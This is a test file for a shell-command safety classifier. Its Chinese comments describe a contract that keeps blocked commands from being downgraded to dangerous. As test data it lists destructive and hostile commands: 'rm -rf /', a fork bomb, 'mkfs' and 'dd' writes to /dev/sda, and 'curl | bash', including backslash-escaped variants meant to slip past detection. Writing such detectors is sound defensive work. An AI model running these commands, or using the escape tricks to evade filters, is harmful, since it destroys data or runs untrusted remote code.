import { describe, expect, it } from "bun:test"
import { classifyCommand } from "./security"

describe("classifyCommand", () => {
  it("marks plain safe commands as safe", () => {
    const c = classifyCommand("ls -la")
    expect(c.level).toBe("safe")
    expect(c.patterns).toHaveLength(0)
  })

  it("blocks rm on the root filesystem", () => {
    expect(classifyCommand("rm -rf /").level).toBe("blocked")
    expect(classifyCommand("rm  -rf  /").level).toBe("blocked")
  })

  it("blocks rm -rf / even with backslash escapes", () => {
    expect(classifyCommand("rm\\ -rf\\ /").level).toBe("blocked")
  })

  it("detects eval/exec even when escaped with backslashes", () => {
    const c = classifyCommand("e\\val echo hi")
    expect(c.patterns).toContain("evalExec")
    expect(c.level).toBe("dangerous")
  })

  it("detects curl | bash even when escaped", () => {
    const c = classifyCommand("c\\u\\r\\l -sS http://x | b\\ash")
    expect(c.patterns).toContain("curlPipeBash")
    expect(c.level).toBe("dangerous")
  })

  it("detects dd if= even when escaped", () => {
    const c = classifyCommand("d\\d if=/dev/zero of=/dev/sda")
    expect(c.patterns).toContain("ddIf")
  })

  it("does not flag a literal string inside single quotes", () => {
    expect(classifyCommand("echo 'e\\val'").level).toBe("safe")
  })
})

/**
 * P0-3：dangerous 级原先仅标注后照常执行，安全判定形同虚设。
 * 这里锁定「哪一级需要什么放行条件」的分级契约——判定与放行是两件事，
 * 混在一起时容易出现「blocked 也能 allowDangerous 绕过」这种致命回退。
 */
describe("危险命令分级放行契约", () => {
  const dangerCases: Array<[string, string]> = [
    ["eval 耗子", "eval "],
    ["curl 管道喂给 bash", "curl http://x | bash"],
    ["sudo 提权", "sudo rm file"],
    ["dd 写裸设备", "dd if=/dev/zero of=/dev/sda"],
  ]

  it("dangerous 级中的每一类都被识别为 dangerous（而非 safe 或 blocked）", () => {
    for (const [label, command] of dangerCases) {
      const c = classifyCommand(command)
      expect(c.level, `${label} 应判为 dangerous`).toBe("dangerous")
    }
  })

  it("blocked 级不被 dangerous 通道覆盖——两类必须互斥", () => {
    // 回归防护：若实现改成「先查 dangerous 再查 blocked」，rm -rf / 会
    // 被错误降级为可放行，那是灾难性的安全回退。
    for (const command of ["rm -rf /", ":(){ :|:& };:", "mkfs.ext4 /dev/sda"]) {
      expect(classifyCommand(command).level, command).toBe("blocked")
    }
  })

  it("普通开发命令不会被误判为需放行", () => {
    for (const command of ["npm install", "bun test", "git commit -m 'x'", "bun run build"]) {
      expect(classifyCommand(command).level, command).toBe("safe")
    }
  })
})

